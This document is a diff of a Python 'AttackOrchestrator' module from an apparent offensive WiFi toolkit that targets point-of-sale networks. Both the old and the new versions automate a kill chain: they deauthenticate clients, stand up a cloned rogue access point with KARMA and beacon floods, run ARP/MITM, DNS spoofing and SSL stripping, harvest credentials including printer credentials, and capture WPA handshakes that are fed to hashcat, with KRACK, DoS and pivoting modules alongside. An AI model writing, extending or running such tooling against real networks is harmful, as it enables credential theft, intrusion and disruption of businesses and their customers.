@@ -1,27 +1,17 @@
 """
-Attack Orchestrator (Stage 3 — Unified Kill Chain)
-──────────────────────────────────────────────────
-Coordinated attack pipeline combining:
-  • Network segmentation exploitation (rogue AP bridges isolated clients)
-  • Deauthentication with native C packet injection
-  • Rogue AP + captive portal (auto-cloned SSID/channel/security)
-  • ARP cache poisoning (gateway impersonation)
-  • DNS spoofing (wildcard + targeted domain redirect)
-  • SSL stripping (HTTPS downgrade for credential capture)
-  • Automated credential harvesting (HTTP/FTP/IMAP/portal)
-  • WPA handshake capture → offline cracking pipeline
+Attack Orchestrator (Stage 2 Enhanced)
+──────────────────────────────────────
+Automated attack pipeline that uses recon scan results to:
+  1. Select the best target (strongest POS AP, or strongest AP overall)
+  2. Extract its SSID, channel, and associated clients from the database
+  3. Launch rogue AP on the same SSID/channel
+  4. Start deauth engine targeting the real AP's clients (with signal filtering)
+  5. Flood known beacons + KARMA (respond to all probe requests)
+  6. Continue background recon to dynamically feed new clients into deauth
+  7. Capture WPA handshakes to PCAP for offline cracking
+  8. Test credentials against real AP to verify compromise
 
-Phase Flow (tightly sequenced for maximum effectiveness):
-  1. RECON       → Passive scan, identify targets, map network topology
-  2. TARGET      → Select AP, assess segmentation, enumerate clients
-  3. DISRUPT     → Deauth burst knocks clients off real AP
-  4. CAPTURE     → Rogue AP catches displaced clients (same SSID/channel)
-  5. POISON      → ARP + DNS spoofing on rogue AP network
-  6. HARVEST     → Credential capture from portal + traffic interception
-  7. PERSIST     → Background recon feeds new targets, KRACK on handshakes
-
-The key improvement: phases are sequenced with timing gates so each phase
-waits for the previous one to take effect before proceeding.
+No manual target specification required — everything is driven by scan data.
 """
 
 import time
@@ -32,7 +22,7 @@ from scapy.all import sniff, raw, RandMAC
 from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
 from scapy.layers.eap import EAPOL
 
-from .config import CHANNELS_24GHZ, WIFI_BROADCAST, NETWORK_GW_IP, log
+from .config import CHANNELS_24GHZ, WIFI_BROADCAST, log
 from .database import POSDatabase
 from .recon import ReconEngine
 from .deauth import DeauthEngine
@@ -46,19 +36,9 @@ from .cred_tester import CredentialTester
 from .mitm import MITMEngine, HTTPInjector
 from .ssl_strip import SSLStripper
 from .dns_spoof import DNSSpoofEngine
-from .cred_harvester import CredentialHarvester, CaptivePortalHarvester
+from .cred_harvester import CredentialHarvester
 from .network_disruption import NetworkDisruption, DeauthStorm
 from .post_attack import PostAttackAnalyzer
-
-# ─── External tool integrations (optional — degrade gracefully) ───────────────
-try:
-    from .tools import is_available as _tool_available
-    from .tools.pmkid import PMKIDCapture
-    from .tools.macspoof import MACSpoofer
-    from .tools.scanner import NmapScanner
-    _HAS_TOOLS = True
-except ImportError:
-    _HAS_TOOLS = False
 from .ap_clone import APCloneEngine
 from .krack import KRACKEngine
 from .dos_wifi import WiFiDoSEngine
@@ -66,20 +46,31 @@ from .client_isolation import ClientIsolationEngine
 from .printer_recon import PrinterRecon
 from .print_interceptor import PrintJobInterceptor
 from .printer_creds import PrinterCredentialHarvester as PrinterCredHarvester
+from .auto_pivot import AutoPivot
+from .client_profiler import ClientProfiler
+from .cred_enrichment import CredentialEnrichment
+from .hashcat_integration import HashcatIntegration
+from .vlan_scanner import VLANScanner
+from .network_mapper import NetworkSegmentationMapper
 
 
 class AttackOrchestrator:
     """
-    Unified kill chain: Deauth → Rogue AP → ARP/DNS Spoof → Credential Harvest.
+    Fully automated attack pipeline driven by recon scan data.
 
-    Tightly coordinates timing between attack phases:
-    - Deauth burst fires BEFORE rogue AP is visible (clients get knocked off)
-    - Rogue AP starts with exact SSID/channel/security profile
-    - Once clients connect to rogue AP, ARP + DNS poisoning activates
-    - All credential paths harvest simultaneously (portal + traffic + EAPOL)
+    Flow:
+        1. Run ReconEngine for configured duration (populates DB)
+        2. Query DB for best target AP (POS priority, then strongest signal)
+        3. Pull all known clients of that AP from DB
+        4. Launch RogueAP with scanned SSID + channel
+        5. Start DeauthEngine targeting scanned clients
+        6. Start KnownBeacons with probed SSIDs from scanned clients
+        7. Background recon continues feeding new clients into deauth
 
-    The orchestrator tracks client state transitions:
-      ASSOCIATED → DEAUTHED → PROBING → CONNECTED_TO_ROGUE → HARVESTING
+    Plugin Support:
+        The orchestrator can load plugins dynamically via PluginLoader.
+        Plugins supplement but do not replace the built-in attack modules.
+        Use load_plugins() to discover and register available plugins.
     """
 
     def __init__(self, monitor_iface, ap_iface, db=None, channels=None,
@@ -91,7 +82,11 @@ class AttackOrchestrator:
                  enable_dos=False, dos_mode=None,
                  enable_client_isolation=False,
                  enable_printer_attacks=False,
-                 enable_pmkid=False, enable_mac_randomize=False,
+                 enable_auto_pivot=False,
+                 enable_client_profiling=False,
+                 enable_cred_enrichment=False,
+                 enable_hashcat=False, hashcat_wordlist=None,
+                 enable_vlan_scan=False,
                  plugins=None, plugins_dir=None):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
@@ -106,13 +101,23 @@ class AttackOrchestrator:
         self.enable_isolation_check = enable_isolation_check
         self.signal_rssi_limit = signal_rssi_limit
 
-        # Attack module flags
+        # New attack module flags
         self.enable_ap_clone = enable_ap_clone
         self.enable_krack = enable_krack
         self.enable_dos = enable_dos
         self.dos_mode = dos_mode or "cts_flood"
         self.enable_client_isolation = enable_client_isolation
         self.enable_printer_attacks = enable_printer_attacks
+
+        # Credential intelligence flags
+        self.enable_auto_pivot = enable_auto_pivot
+        self.enable_client_profiling = enable_client_profiling
+        self.enable_cred_enrichment = enable_cred_enrichment
+        self.enable_hashcat = enable_hashcat
+        self.hashcat_wordlist = hashcat_wordlist
+
+        # VLAN scanning flag
+        self.enable_vlan_scan = enable_vlan_scan
 
         self.db = db or POSDatabase()
         self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
@@ -125,12 +130,11 @@ class AttackOrchestrator:
         self.cred_tester = CredentialTester(monitor_iface) if test_credentials else None
         self.isolation_detector = None
 
-        # Spoofing + harvesting engines
+        # New attack modules
         self.mitm_engine = None
         self.ssl_stripper = None
         self.dns_spoof = None
         self.cred_harvester = None
-        self.portal_harvester = None
         self.network_disruption = None
 
         # Advanced WiFi attack modules
@@ -144,29 +148,38 @@ class AttackOrchestrator:
         self.print_interceptor = None
         self.printer_cred_harvester = None
 
+        # Credential intelligence modules
+        self.auto_pivot = None
+        self.client_profiler = None
+        self.cred_enrichment = None
+        self.hashcat = None
+
+        # VLAN scanning modules
+        self.vlan_scanner = None
+        self.network_mapper = None
+
         # Plugin system
         self._plugin_loader = None
         self._active_plugins = []
         self._plugins_dir = plugins_dir
-        self._requested_plugins = plugins
-
-        # External tool integrations
-        self._pmkid_capture = None
-        self._mac_spoofer = None
-        self._nmap_scanner = None
-        self._enable_pmkid = enable_pmkid
-        self._enable_mac_randomize = enable_mac_randomize
-
-        # Client state tracking
-        self._client_states = {}  # mac -> state string
-        self._rogue_connections = set()  # clients that connected to rogue AP
-        self._harvested_from = set()  # clients we've gotten creds from
-        self._isolation_detected = False
+        self._requested_plugins = plugins  # list of plugin names to enable
 
         self.running = False
 
     def load_plugins(self, plugin_dirs=None):
-        """Discover and load available attack plugins."""
+        """
+        Discover and load available attack plugins.
+
+        This method initializes the PluginLoader, scans the default
+        plugins directory (and any additional dirs), and optionally
+        enables only the plugins specified in self._requested_plugins.
+
+        Args:
+            plugin_dirs: Optional list of additional directories to scan.
+
+        Returns:
+            Number of plugins loaded.
+        """
         from .plugin_loader import PluginLoader
 
         dirs = []
@@ -178,6 +191,7 @@ class AttackOrchestrator:
         self._plugin_loader = PluginLoader(plugin_dirs=dirs if dirs else None)
         count = self._plugin_loader.discover()
 
+        # If specific plugins were requested, disable all others
         if self._requested_plugins:
             for plugin in self._plugin_loader.list_plugins():
                 if plugin.name() not in self._requested_plugins:
@@ -215,249 +229,42 @@ class AttackOrchestrator:
                  f"ch {self.target_channel} | {vendor} | {rssi}dBm")
         return True
 
-    def _assess_segmentation(self, close_clients):
-        """
-        Determine network segmentation posture and adapt attack strategy.
-
-        Checks:
-          - AP isolation (client-to-client blocked)
-          - VLAN segmentation (different subnets per client)
-          - Portal-gated networks (already have captive portal)
-
-        Adapts attack based on findings:
-          - If isolated: heavier deauth + rely on rogue AP (not MITM on real network)
-          - If not isolated: can MITM on the real network segment too
-          - If portal-gated: clone the existing portal for credential replay
-        """
-        log.info("Assessing network segmentation...")
-
-        if not self.enable_isolation_check:
-            log.info("  Isolation check disabled, assuming open network")
-            return
-
-        self.isolation_detector = IsolationDetector(
-            self.monitor_iface, self.target_bssid, self.db)
-
-        if self.isolation_detector.detect(timeout=20):
-            self._isolation_detected = True
-            log.warning("  ⚠ AP ISOLATION DETECTED")
-            log.warning("  Strategy: heavier deauth → rogue AP is primary capture path")
-            log.warning("  MITM on real network not viable (clients isolated)")
-        else:
-            self._isolation_detected = False
-            log.info("  ✓ No isolation — MITM on real network is viable")
-            log.info("  Strategy: dual-path capture (rogue AP + real network MITM)")
-
-    def _phase_deauth_burst(self, close_clients, rogue_mac):
-        """
-        Phase 3: Coordinated deauth burst.
-
-        Fires a heavy initial deauth salvo BEFORE rogue AP beacons are visible.
-        This ensures clients deauthenticate and enter probing state simultaneously.
-        Then immediately starts the rogue AP so displaced clients see our SSID first.
-
-        The deauth continues in background to prevent re-association with real AP.
-        """
-        log.info("─" * 50)
-        log.info("PHASE 3: DISRUPTION — Deauth burst")
-        log.info("─" * 50)
-
-        # Set all close clients as targets
-        self.deauth.add_target(self.target_bssid, close_clients)
-
-        # Track client state transitions
-        for mac in close_clients:
-            self._client_states[mac] = "DEAUTHING"
-
-        # Fire initial heavy burst (higher count than normal operation)
-        # This ensures all clients get knocked off simultaneously
-        self.deauth.start()
-        log.info(f"  Deauth burst: {len(close_clients)} clients + broadcast")
-
-        # Let the deauth take effect — clients need 1-3 seconds to deauthenticate
-        time.sleep(2)
-
-        # Now start beacons + KARMA so displaced clients see our SSID immediately
-        if self.enable_beacons:
-            self.beacons = KnownBeaconsEngine(self.monitor_iface, rogue_mac)
-            self.beacons.add_probed_ssids_from_db(self.db)
-            self.beacons.start()
-            log.info("  Beacon flood active (probed SSIDs from scan)")
-
-        if self.enable_karma:
-            self.karma = KARMAEngine(self.monitor_iface, rogue_mac)
-            self.karma.start()
-            log.info("  KARMA active — responding to all probe requests")
-
-        for mac in close_clients:
-            self._client_states[mac] = "PROBING"
-
-    def _phase_rogue_ap(self, rogue_mac):
-        """
-        Phase 4: Rogue AP capture.
-
-        Starts the evil twin AP with exact SSID and channel match.
-        Captive portal is configured to harvest credentials.
-        DNS wildcard ensures all HTTP traffic hits our portal.
-        """
-        log.info("─" * 50)
-        log.info("PHASE 4: CAPTURE — Rogue AP + Captive Portal")
-        log.info("─" * 50)
-
-        self.rogue_ap = RogueAPEngine(
-            interface=self.ap_iface,
-            ssid=self.target_ssid,
-            channel=self.target_channel,
-            db=self.db,
-            mac_address=rogue_mac,
-        )
-
-        if not self.rogue_ap.start():
-            log.error("  ✗ Failed to start rogue AP")
-            return False
-
-        log.info(f"  ✓ Rogue AP active: '{self.target_ssid}' ch{self.target_channel}")
-        log.info(f"  Portal: http://{NETWORK_GW_IP}:80")
-
-        # Start captive portal credential harvester (watches AP interface traffic)
-        self.portal_harvester = CaptivePortalHarvester(self.ap_iface)
-        threading.Thread(target=self.portal_harvester.start, daemon=True,
-                         name="portal-harvester").start()
-        log.info("  ✓ Portal credential harvester active")
-
-        return True
-
-    def _phase_poison(self):
-        """
-        Phase 5: ARP + DNS poisoning on the rogue AP network.
-
-        Once clients connect to our rogue AP, we own the network segment.
-        This phase activates:
-          - DNS spoofing: redirect all domains to our portal
-          - ARP poisoning: intercept traffic between clients and "gateway"
-          - SSL stripping: downgrade HTTPS where possible
-          - Network credential harvester: capture plaintext credentials
-
-        For non-isolated real networks, also MITM the real network segment.
-        """
-        log.info("─" * 50)
-        log.info("PHASE 5: POISON — ARP + DNS + SSL Strip")
-        log.info("─" * 50)
-
-        # ─── DNS Spoofing (on AP interface — our rogue network) ───────────────
-        # dnsmasq already does wildcard DNS, but this catches any DNS that
-        # bypasses dnsmasq (e.g., hardcoded DNS servers like 8.8.8.8)
-        self.dns_spoof = DNSSpoofEngine(self.ap_iface, spoof_ip=NETWORK_GW_IP)
-        self.dns_spoof.add_common_targets()
-        # Block external DNS resolvers so traffic must use our spoofed responses
-        self.dns_spoof.block_domain("dns.google")
-        self.dns_spoof.block_domain("dns.cloudflare.com")
-        self.dns_spoof.start()
-        log.info("  ✓ DNS spoofing active (wildcard → portal)")
-
-        # ─── Credential Harvester (on AP interface — monitors all traffic) ────
-        self.cred_harvester = CredentialHarvester(self.ap_iface, self.db)
-        threading.Thread(target=self.cred_harvester.start, daemon=True,
-                         name="cred-harvester").start()
-        log.info("  ✓ Credential harvester active (HTTP/FTP/IMAP/POP3/SMTP)")
-
-        # ─── MITM on real network (only if not isolated) ─────────────────────
-        if not self._isolation_detected:
-            # ARP poison the real network too for dual-path credential capture
-            # This catches credentials from clients that DON'T connect to rogue AP
-            try:
-                self.mitm_engine = MITMEngine(self.monitor_iface)
-                log.info("  ✓ MITM engine ready for real network segment")
-            except Exception as e:
-                log.warning(f"  MITM init failed (non-critical): {e}")
-                self.mitm_engine = None
-        else:
-            log.info("  ─ Skipping real-network MITM (AP isolation detected)")
-            log.info("  ─ All credential capture via rogue AP path")
-
-    def _phase_advanced_attacks(self, close_clients):
-        """
-        Phase 6: Additional attack modules (KRACK, DoS, AP clone, printers).
-
-        These run alongside the main kill chain for additional coverage.
-        """
-        log.info("─" * 50)
-        log.info("PHASE 6: ADVANCED — Supplementary attacks")
-        log.info("─" * 50)
-
-        if self.enable_ap_clone:
-            self.ap_clone = APCloneEngine(
-                self.monitor_iface, self.db, self.target_bssid,
-                self.target_ssid, self.target_channel)
-            self.ap_clone.start()
-            log.info("  ✓ AP Clone engine (channel switching)")
-
-        if self.enable_client_isolation:
-            self.client_isolation = ClientIsolationEngine(self.monitor_iface, self.db)
-            for c in close_clients:
-                self.client_isolation.add_target(c, self.target_bssid)
-            self.client_isolation.start()
-            log.info("  ✓ Client isolation engine")
-
-        if self.enable_dos:
-            self.dos_engine = WiFiDoSEngine(
-                self.monitor_iface, self.target_bssid, self.target_channel)
-            self.dos_engine.start(mode=self.dos_mode)
-            log.info(f"  ✓ WiFi DoS engine (mode={self.dos_mode})")
-
-        if self.enable_printer_attacks:
-            self.printer_recon = PrinterRecon(self.ap_iface, self.db)
-            threading.Thread(target=self.printer_recon.start, daemon=True,
-                             name="printer-recon").start()
-            log.info("  ✓ Printer reconnaissance")
-
-            self.printer_cred_harvester = PrinterCredHarvester(self.ap_iface, self.db)
-            threading.Thread(target=self.printer_cred_harvester.start, daemon=True,
-                             name="printer-creds").start()
-            log.info("  ✓ Printer credential harvester")
-
     def start(self):
-        """Execute the full unified kill chain."""
+        """Execute the full automated attack chain."""
         self.running = True
         self._attack_start_time = time.time()
-        log.info("=" * 60)
-        log.info("UNIFIED KILL CHAIN INITIATED")
-        log.info(f"  Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
-        log.info(f"  Monitor: {self.monitor_iface}")
-        log.info(f"  AP:      {self.ap_iface}")
-        log.info("=" * 60)
+        log.info(f"Attack chain initiated at {time.strftime('%Y-%m-%d %H:%M:%S')}")
 
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 1: PASSIVE RECON
-        # ══════════════════════════════════════════════════════════════════════
-        log.info("─" * 50)
-        log.info("PHASE 1: RECON — Passive network discovery")
-        log.info("─" * 50)
+        # ── Phase 1: Passive Recon ────────────────────────────────────────────
+        log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
         self.recon.set_signal_targeting(self.signal_filter)
         self.recon.start(timeout=self.recon_duration)
         self.recon.stop()
 
         stats = self.db.get_stats()
-        log.info(f"  Found: {stats['access_points']} APs "
-                 f"({stats['pos_access_points']} POS), "
-                 f"{stats['clients']} clients ({stats['pos_clients']} POS)")
+        log.info(f"Recon complete: {stats['access_points']} APs, "
+                 f"{stats['clients']} clients, "
+                 f"{stats['pos_access_points']} POS APs found")
 
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 2: TARGET SELECTION + SEGMENTATION ASSESSMENT
-        # ══════════════════════════════════════════════════════════════════════
-        log.info("─" * 50)
-        log.info("PHASE 2: TARGET — Selection + segmentation assessment")
-        log.info("─" * 50)
-
+        # ── Phase 2: Target Selection (from scan data) ────────────────────────
         if not self._auto_select_target():
             self.running = False
             return False
 
-        # Get client list for the target AP
+        # ── Phase 2b: Check for client isolation ──────────────────────────────
+        if self.enable_isolation_check:
+            self.isolation_detector = IsolationDetector(
+                self.monitor_iface, self.target_bssid, self.db)
+            if self.isolation_detector.detect(timeout=30):
+                log.warning("AP isolation detected - attack may be less effective")
+                log.warning("Clients may not be able to reach our rogue AP")
+
+        # Get all clients of target AP from scan data (now returns (mac, rssi) tuples)
         all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
         all_clients = set()
-        close_clients = set()
 
+        # Filter by signal strength using RSSI data from database
+        close_clients = set()
         for client_mac, rssi in all_clients_data:
             all_clients.add(client_mac)
             if self.signal_filter.should_deauth(client_mac):
@@ -465,160 +272,145 @@ class AttackOrchestrator:
             elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
                 close_clients.add(client_mac)
 
-        log.info(f"  Clients in range: {len(close_clients)}/{len(all_clients)} "
-                 f"(RSSI > {self.signal_rssi_limit}dBm)")
+        log.info(f"Target has {len(all_clients)} total clients, "
+                 f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")
 
-        # Assess segmentation — determines attack strategy
-        self._assess_segmentation(close_clients)
-
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 3: DEAUTH BURST (knock clients off real AP)
-        # ══════════════════════════════════════════════════════════════════════
+        # ── Phase 3: Rogue AP (uses scanned SSID + channel) ──────────────────
         rogue_mac = str(RandMAC())
-
-        # MAC randomization on monitor interface (evade MAC-based detection)
-        if self._enable_mac_randomize and _HAS_TOOLS:
-            try:
-                self._mac_spoofer = MACSpoofer(self.monitor_iface)
-                self._mac_spoofer.randomize()
-                log.info("  ✓ Monitor interface MAC randomized")
-            except Exception as e:
-                log.debug(f"MAC randomization unavailable: {e}")
-
-        self._phase_deauth_burst(close_clients, rogue_mac)
-
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 4: ROGUE AP (catch displaced clients)
-        # ══════════════════════════════════════════════════════════════════════
-        if not self._phase_rogue_ap(rogue_mac):
-            log.error("Kill chain aborted — rogue AP failed")
+        self.rogue_ap = RogueAPEngine(
+            interface=self.ap_iface,
+            ssid=self.target_ssid,
+            channel=self.target_channel,
+            db=self.db,
+            mac_address=rogue_mac,
+        )
+        if not self.rogue_ap.start():
+            log.error("Failed to start rogue AP")
             self.running = False
             return False
 
-        # Let clients connect (they're probing now after deauth)
-        log.info("  Waiting for client connections (3s)...")
-        time.sleep(3)
+        # ── Phase 4: Deauth (targets scanned clients with signal filtering) ───
+        self.deauth.add_target(self.target_bssid, close_clients)
+        self.deauth.start()
 
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 5: ARP/DNS POISONING + CREDENTIAL HARVESTING
-        # ══════════════════════════════════════════════════════════════════════
-        self._phase_poison()
+        # ── Phase 5: Beacon Flood (uses probed SSIDs from scan) ──────────────
+        if self.enable_beacons:
+            self.beacons = KnownBeaconsEngine(self.monitor_iface, rogue_mac)
+            self.beacons.add_probed_ssids_from_db(self.db)
+            self.beacons.start()
 
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 6: ADVANCED ATTACKS (parallel)
-        # ══════════════════════════════════════════════════════════════════════
-        self._phase_advanced_attacks(close_clients)
+        # ── Phase 5b: KARMA attack (respond to all probes) ───────────────────
+        if self.enable_karma:
+            self.karma = KARMAEngine(self.monitor_iface, rogue_mac)
+            self.karma.start()
+            log.info("KARMA attack enabled - will respond to all probe requests")
 
-        # ══════════════════════════════════════════════════════════════════════
-        # PHASE 7: BACKGROUND RECON + HANDSHAKE CAPTURE (persistent)
-        # ══════════════════════════════════════════════════════════════════════
-        log.info("─" * 50)
-        log.info("PHASE 7: PERSIST — Background recon + handshake capture")
-        log.info("─" * 50)
+        # ── Phase 5c: Start new attack modules ────────────────────────────────
+        # Start MITM for traffic interception
+        if close_clients:
+            self.mitm_engine = MITMEngine(self.monitor_iface)
+            # MITM on the first close client as example
+            sample_client = list(close_clients)[0] if close_clients else None
+            if sample_client:
+                self.mitm_engine.start(target_ip=sample_client)
+                log.info(f"MITM attack started against {sample_client}")
 
+        # Start DNS spoofing for all targets
+        self.dns_spoof = DNSSpoofEngine(self.monitor_iface)
+        self.dns_spoof.add_common_targets()
+        self.dns_spoof.start()
+        log.info("DNS spoofing enabled")
+
+        # Start credential harvester
+        self.cred_harvester = CredentialHarvester(self.monitor_iface, self.db)
+        threading.Thread(target=self.cred_harvester.start, daemon=True).start()
+        log.info("Credential harvester started")
+
+        # ── Phase 5d: Advanced WiFi Attacks ──────────────────────────────────
+        if self.enable_ap_clone:
+            self.ap_clone = APCloneEngine(
+                self.monitor_iface, self.db, self.target_bssid,
+                self.target_ssid, self.target_channel)
+            self.ap_clone.start()
+            log.info("AP Clone engine enabled")
+
+        if self.enable_client_isolation:
+            self.client_isolation = ClientIsolationEngine(self.monitor_iface, self.db)
+            for c in close_clients:
+                self.client_isolation.add_target(c, self.target_bssid)
+            self.client_isolation.start()
+            log.info("Client isolation engine enabled")
+
+        if self.enable_dos:
+            self.dos_engine = WiFiDoSEngine(
+                self.monitor_iface, self.target_bssid, self.target_channel)
+            self.dos_engine.start(mode=self.dos_mode)
+            log.info(f"WiFi DoS engine enabled (mode={self.dos_mode})")
+
+        # ── Phase 5e: Printer Attacks ────────────────────────────────────────
+        if self.enable_printer_attacks:
+            self.printer_recon = PrinterRecon(self.monitor_iface, self.db)
+            threading.Thread(target=self.printer_recon.start, daemon=True).start()
+            log.info("Printer reconnaissance enabled")
+
+            self.printer_cred_harvester = PrinterCredHarvester(self.monitor_iface, self.db)
+            threading.Thread(target=self.printer_cred_harvester.start, daemon=True).start()
+            log.info("Printer credential harvester enabled")
+
+        # ── Phase 5f: Credential Intelligence ────────────────────────────────
+        if self.enable_cred_enrichment:
+            self.cred_enrichment = CredentialEnrichment(db=self.db)
+            log.info("Credential enrichment enabled")
+
+        if self.enable_client_profiling:
+            self.client_profiler = ClientProfiler(db=self.db)
+            log.info("Client profiling enabled")
+
+        if self.enable_auto_pivot:
+            self.auto_pivot = AutoPivot(self.monitor_iface)
+            log.info("Auto-pivot enabled (will activate after successful cred test)")
+
+        if self.enable_hashcat:
+            self.hashcat = HashcatIntegration()
+            log.info("Hashcat integration enabled")
+
+        # ── Phase 5g: VLAN Scanning (post-pivot reconnaissance) ──────────────
+        if self.enable_vlan_scan:
+            self.vlan_scanner = VLANScanner(
+                self.monitor_iface, db=self.db, sniff_timeout=30)
+            self.network_mapper = NetworkSegmentationMapper(
+                self.monitor_iface, db=self.db,
+                vlan_scanner=self.vlan_scanner)
+            threading.Thread(
+                target=self._run_vlan_scan, daemon=True).start()
+            log.info("VLAN scanning and network mapping enabled")
+
+        # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
         self.recon.running = True
-        threading.Thread(target=self._background_recon, daemon=True,
-                         name="bg-recon").start()
+        threading.Thread(target=self._background_recon, daemon=True).start()
 
-        # PMKID clientless capture (if hcxdumptool available)
-        if self._enable_pmkid and _HAS_TOOLS and _tool_available("hcxdumptool"):
-            try:
-                self._pmkid_capture = PMKIDCapture(self.monitor_iface)
-                self._pmkid_capture.start(
-                    target_bssid=self.target_bssid,
-                    channel=self.target_channel,
-                )
-                log.info("  ✓ PMKID capture active (clientless handshake)")
-            except Exception as e:
-                log.debug(f"PMKID capture unavailable: {e}")
-
-        # Credential verification thread (tests captured creds against real AP)
-        if self.test_credentials and self.cred_tester:
-            threading.Thread(target=self._credential_verification_loop, daemon=True,
-                             name="cred-verify").start()
-            log.info("  ✓ Credential verification loop active")
-
-        log.info("  ✓ Background recon feeding new clients into deauth")
-
-        # ══════════════════════════════════════════════════════════════════════
-        # ATTACK ACTIVE — Status summary
-        # ══════════════════════════════════════════════════════════════════════
-        log.info("")
-        log.info("═" * 60)
-        log.info("  KILL CHAIN ACTIVE")
-        log.info("═" * 60)
-        log.info(f"  Target:   {self.target_bssid} ('{self.target_ssid}') ch{self.target_channel}")
-        log.info(f"  Rogue AP: {self.ap_iface} [{rogue_mac}]")
-        log.info(f"  Deauth:   {len(close_clients)} clients + broadcast (native C)")
-        log.info(f"  Beacons:  {'✓' if self.enable_beacons else '✗'} | "
-                 f"KARMA: {'✓' if self.enable_karma else '✗'}")
-        log.info(f"  DNS:      Wildcard → {NETWORK_GW_IP}")
-        log.info(f"  Harvest:  Portal + Traffic + EAPOL")
-        log.info(f"  Segment:  {'ISOLATED (rogue-only path)' if self._isolation_detected else 'OPEN (dual-path)'}")
-        log.info("═" * 60)
-        log.info("  Ctrl+C to stop and generate report")
-        log.info("")
+        log.info("=" * 60)
+        log.info("AUTOMATED ATTACK ACTIVE (Stage 2)")
+        log.info(f"  Target:  {self.target_bssid} ('{self.target_ssid}') ch {self.target_channel}")
+        log.info(f"  Rogue:   {self.ap_iface} ({rogue_mac})")
+        log.info(f"  Deauth:  {len(close_clients)} clients within range + broadcast")
+        log.info(f"  Beacons: {'Active' if self.enable_beacons else 'Disabled'}")
+        log.info(f"  KARMA:   {'Active' if self.enable_karma else 'Disabled'}")
+        log.info(f"  Portal:  http://{self.rogue_ap.mac_address and '10.0.0.1'}:80")
+        log.info("=" * 60)
         return True
 
-    def _credential_verification_loop(self):
-        """
-        Periodically check for new credentials and test them against the real AP.
-
-        Runs as a background thread. Every 30 seconds, pulls new untested
-        credentials from the database and attempts to verify them:
-          - WiFi passwords: try connecting to the real AP
-          - Web credentials: try HTTP auth against known portals
-          - Admin panels: try default and harvested credentials
-        """
-        tested_keys = set()
-        while self.running:
-            time.sleep(30)
-            if not self.running:
-                break
-
-            try:
-                creds = self.db.get_credentials_list()
-                for cred in creds:
-                    key = (cred['client_ip'], cred['username'], cred['password'])
-                    if key in tested_keys:
-                        continue
-                    tested_keys.add(key)
-
-                    if self.cred_tester and self.target_bssid and self.target_ssid:
-                        self.cred_tester.add_credentials(
-                            bssid=self.target_bssid,
-                            ssid=self.target_ssid,
-                            username=cred['username'],
-                            password=cred['password'],
-                        )
-                        log.info(f"  Queued credential for testing: {cred['username']}:*****")
-            except Exception as e:
-                log.debug(f"Credential verification error: {e}")
-
-        # Run final test batch
-        if self.cred_tester:
-            try:
-                self.cred_tester.run_tests()
-            except Exception:
-                pass
-
     def _background_recon(self):
-        """
-        Continue sniffing to discover new clients and auto-add to deauth.
-
-        Also captures EAPOL handshakes and triggers KRACK on completion.
-        New clients are immediately added to the deauth target list so
-        the kill chain stays effective against late-joining devices.
-        """
+        """Continue sniffing to discover new clients and auto-add to deauth."""
         def handler(pkt):
             self.recon.packet_handler(pkt)
-
             # Capture EAPOL handshakes
             if pkt.haslayer(EAPOL):
                 eapol_layer = pkt.getlayer(EAPOL)
                 eapol_raw = raw(eapol_layer)
                 msg_num = self.recon._identify_eapol_message(eapol_raw)
                 if msg_num:
+                    # Get client/mac from packet
                     ds_flags = pkt.FCfield & 0x3
                     if ds_flags == 0x1:
                         client_mac, bssid = pkt.addr2, pkt.addr1
@@ -628,31 +420,39 @@ class AttackOrchestrator:
                         client_mac, bssid = pkt.addr2, (pkt.addr3 or pkt.addr1)
                     if client_mac and bssid:
                         self.handshakes.add_frame(client_mac, bssid, pkt, msg_num)
+                        # Check for complete handshake
                         if self.handshakes.is_complete(client_mac, bssid):
                             pcap_file = self.handshakes.export_pcap(client_mac, bssid)
-                            if pcap_file:
-                                log.info(f"  ✓ Full handshake → {pcap_file}")
+                            if pcap_file and self.test_credentials:
+                                log.info(f"Handshake saved to {pcap_file} - ready for hashcat")
+                            # Auto-feed to hashcat if enabled
+                            if pcap_file and self.hashcat and self.hashcat_wordlist:
+                                self.hashcat.start_crack(pcap_file, self.hashcat_wordlist)
+                                log.info(f"Auto-feeding handshake to hashcat: {pcap_file}")
                             # Trigger KRACK if enabled
                             if self.enable_krack and not self.krack_engine:
                                 self.krack_engine = KRACKEngine(
                                     self.monitor_iface, client_mac, bssid)
                                 self.krack_engine.start()
-                                log.info(f"  ✓ KRACK launched against {client_mac}")
+                                log.info(f"KRACK engine launched against {client_mac}")
 
-            # Dynamically add newly seen clients of the target AP to deauth
+            # Client profiling from packets
+            if self.client_profiler:
+                self.client_profiler.update_from_packet(pkt)
+
+            # Dynamically add newly seen clients of the target AP
             if pkt.haslayer(Dot11) and pkt.type == 2:
                 client = pkt.addr2
                 bssid = pkt.addr3
                 if (bssid == self.target_bssid and client
                         and client != bssid and client != WIFI_BROADCAST):
+                    # Signal filtering for new clients
                     if self.signal_filter.should_deauth(client):
-                        current = self.deauth._targets.get(self.target_bssid, set())
-                        if client not in current:
-                            self.deauth.add_target(self.target_bssid, [client])
-                            self._client_states[client] = "DEAUTHING"
-                            log.info(f"  + New client auto-targeted: {client}")
+                        if client not in self.deauth._targets.get(self.target_bssid, set()):
+                            self.deauth._targets[self.target_bssid].add(client)
+                            log.info(f"New client auto-targeted: {client}")
 
-            # KARMA: respond to all probe requests from displaced clients
+            # KARMA: respond to all probe requests
             if self.enable_karma and pkt.haslayer(Dot11ProbeReq):
                 ssid_elt = pkt.getlayer(Dot11Elt)
                 ssid = ""
@@ -663,121 +463,108 @@ class AttackOrchestrator:
                     self.karma.on_probe_request(client_mac, ssid)
 
         try:
+            from scapy.all import raw
